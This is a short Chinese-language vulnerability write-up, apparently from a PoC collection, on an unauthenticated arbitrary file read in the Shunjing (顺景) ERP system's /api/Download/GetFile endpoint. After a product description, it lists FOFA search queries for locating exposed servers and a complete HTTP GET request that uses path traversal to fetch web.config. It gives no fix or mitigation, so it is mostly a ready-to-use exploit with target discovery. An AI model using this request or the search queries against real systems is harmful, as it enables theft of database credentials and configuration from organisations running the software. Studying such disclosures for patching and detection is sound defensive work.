# 顺景ERP系统GetFile任意文件读取漏洞

顺景ERP是一款功能全面、高度集成、易于扩展的企业管理软件，能够帮助制造企业实现智能化、精益化管理，提升企业的竞争力和盈利能力。为企业提供全方位信息化的管理应用与支持，例如，在精密五金行业，系统可根据企业的业务流程及特性提供针对性信息化管理方案；在注塑行业，系统具有完整的水口料管理方案，对企业成本控制严谨到位；在电子行业，系统的BOM批量变更功能，能快速准确进行物料变更，并支持替代料功能等。顺景ERP Download/GetFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="/api/DBRecord/getDBRecords"
body="顺景软件 WebAPI 服务端"
```

## poc

```javascript
GET /api/Download/GetFile?FileName=/../web.config&Title= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241128093802818](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280938886.png)
